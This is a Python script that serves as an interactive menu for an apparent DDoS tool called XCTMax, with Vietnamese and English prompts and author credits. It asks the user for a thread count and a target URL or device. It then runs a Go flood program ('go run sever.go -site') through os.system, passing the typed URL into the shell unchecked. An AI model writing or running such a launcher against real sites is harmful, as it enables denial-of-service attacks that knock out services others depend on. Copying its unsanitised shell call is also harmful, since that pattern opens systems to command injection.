
from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import os
import pyttsx3
import sys
import platform
def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet XCTMax DoS Attack')
else:
    os.system('pyfiglet XCTMax  DoS Attack')

print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Anonymous SoViet Community                                                      ') 
print(Back.GREEN + Fore.BLACK + '[+] XCTMax-DDoS Tool BETA VERSION 0.1                                             ')
print(Back.BLACK +Fore.GREEN + '[+] XCTMAX-DoS Tool Interactive Menu in Python by Nguyễn Công Tùng                                          ')
print(Fore.YELLOW + '[+] Anh là Tùng Đẹp Trai, Anh đến từ Bắc Giang, Đừng Quên Anh                            ')
print(Fore.GREEN + '[+] MỌI HOẠT ĐỘNG TẤN CÔNG CỦA BẠN ĐỀU ĐƯợC ADMIN WEBSITE THEO DÕI. KHÔNG NÊN TẤN CÔNG WEB CÓ CLOUDFLARE           ')
print(Fore.BLUE + 'Author: ' + Fore.GREEN + 'Nguyễn Công Tùng: link Facebook: https://www.facebook.com/NguyenCongTung.Profile (Cởi Trần Rán Cá)')
print(Fore.RED + 'Youtube: ' + Fore.GREEN + 'https://youtube.com/channel/UC6fyN_WM7HupRJqPjb38Mug')
print(Fore.YELLOW + 'GitHub: ' + Fore.GREEN + 'https://github.com/xctmax')
print('Hệ Điều Hành của bạn:'+ Fore.RED + str(platform.system())+Fore.GREEN)
try:
    threads = input('[+] Nhập số lượng' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'cho DDoS >>>')
    site = input(Fore.BLUE + '[+] Nhập URL web để' + Fore.RED + ' DoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Dùng Googlecolab không? [Y/N]')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run sever.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run sever.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run sever.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')

